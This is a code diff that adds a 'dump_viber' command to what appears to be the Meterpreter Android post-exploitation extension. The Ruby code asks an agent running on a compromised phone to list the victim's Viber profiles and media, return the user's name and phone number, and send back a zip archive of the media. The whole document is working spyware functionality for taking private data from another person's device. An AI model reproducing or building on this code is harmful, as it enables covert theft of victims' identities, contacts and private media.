@@ -121,6 +121,43 @@ class Android < Extension
     is_rooted = response.get_tlv(TLV_TYPE_CHECK_ROOT_BOOL).value
     return is_rooted
   end
+
+  def dump_viber(cmd)
+    request = Packet.create_request('dump_viber')
+    case cmd
+    when "profiles"
+      profiles = Array.new
+      request.add_tlv(TLV_TYPE_VIBER_STRING, "enum_profiles")
+      response = client.send_request(request)
+      response.each(TLV_TYPE_VIBER_STRING) { |s|
+        profiles << client.unicode_filter_encode(s.value)
+      }
+      return profiles
+    when "media"
+      media = Array.new
+      request.add_tlv(TLV_TYPE_VIBER_STRING, "enum_media")
+      response = client.send_request(request)
+      response.each(TLV_TYPE_VIBER_STRING) { |s|
+        media << client.unicode_filter_encode(s.value)
+      }
+      return media
+    when "user"
+      user = Hash.new
+      request.add_tlv(TLV_TYPE_VIBER_STRING, "enum_user")
+      response = client.send_request(request)
+      user = 
+      {
+        'name' => client.unicode_filter_encode(response.get_tlv(TLV_TYPE_VIBER_USER).value),
+        'number' => response.get_tlv(TLV_TYPE_VIBER_NUMBER).value
+      }
+      return user
+    when "zip"
+      request.add_tlv(TLV_TYPE_VIBER_STRING, "zip_media")
+      response = client.send_request(request)
+      return response.get_tlv(TLV_TYPE_VIBER_MEDIA_ARCH).value
+    end    
+    return
+  end
   
 end
 
